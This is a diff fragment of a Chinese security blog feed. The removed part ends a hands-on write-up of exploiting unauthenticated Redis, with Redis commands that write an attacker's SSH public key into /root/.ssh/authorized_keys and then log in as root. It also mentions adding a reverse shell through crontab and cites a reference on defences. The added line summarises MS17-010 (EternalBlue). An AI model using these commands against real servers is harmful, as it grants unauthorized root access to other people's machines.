-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker cp ./key.txt redis:/home
-</code></pre></div></div>
-
-<p>进入容器，如图操作发现没有权限，很遗憾，但是说明此方法也不可行了。</p>
-
-<p><img src="/images/vul/redis/7.jpg" alt="" /></p>
-
-<p>如果有权限的话就可以</p>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span>
-     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">get</span> <span class="n">dir</span>
-     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="nv">"authorized_keys"</span>
-     <span class="o">&gt;</span> <span class="n">save</span>
-
-<span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">a</span> <span class="n">root</span><span class="o">@</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>     
-</code></pre></div></div>
-
-<p>或者如下</p>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span>
-      <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="n">authorized_keys</span>
-      <span class="o">&gt;</span> <span class="k">set</span> <span class="n">x</span> <span class="nv">"</span><span class="se">\n\n\n</span><span class="nv">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC87XDbro8GLpOd4CLvm4uEkyeHAg5qElanEaiYIVh19fo6DvEYHjvUJ6+xg86wXSqbO9YPBvW+ZBFEDwq2ywVOL0jxrQ26GdQwY4SSfvrKdPKUVLvoV5+haZ6wc9ECK0P5rVuVuljWYTh+T5TCubEdXa5QKWNf+lGqDED6unUg4RuvI+1+LAWPrSTMGuYazHYC5GMVp/Y/eA9jrbEH3BZyYLLdsYB4yBw3Ej6hezpFjIJsOJaTx9PlO2rce7VJjCZkCRu5eqLkSqyEFEyD2UNVPQ21oIzaVg4rShMij1r6R8CMpc6mysbOEcEsCBLNZxN3EfwGOwtSYa8LV3d0mHXn ubuntu@VM-20-16-ubuntu</span><span class="se">\n\n\n</span><span class="nv">"</span>
-      <span class="o">&gt;</span> <span class="n">save</span>
-</code></pre></div></div>
-
-<h3 id="方法3-修改目标机器的crontab-添加弹shell命令">方法3 修改目标机器的crontab 添加弹shell命令</h3>
-
-<ul>
-  <li><a href="/linux-tricks/crontab/">Linux - Crontab</a></li>
-</ul>
-
-<p>很可惜在目标机器中没有找到 /var/spool/cron 文件夹</p>
-
-<p>如果写到/etc/crontab文件中能否利用成功呢？到处都是知识盲区，还是得自己搭环境慢慢试。</p>
-
-<h2 id="0x04-小结">0x04 小结</h2>
-<p>我感觉这个漏洞算是挺常见的，经常能在其他文章中看到，今天自己也挖到了，于是就简单学习了一波。这算是很古老的漏洞了吧，但是在今天仍然随处可见，正说明了人类的不良习惯造成的漏洞是没办法打补丁的。</p>
-
-<p>参考文章（里面防护方法也很详细）
-https://www.freebuf.com/articles/network/170904.html</p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="redis" /><category term="unauthorized" /><category term="linux" /><category term="ssh" /><summary type="html"><![CDATA[Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。]]></summary></entry></feed>
+<p><img src="/images/vul/ms17-010/3.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="windows" /><category term="smb" /><category term="msf" /><category term="rce" /><summary type="html"><![CDATA[MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。]]></summary></entry></feed>
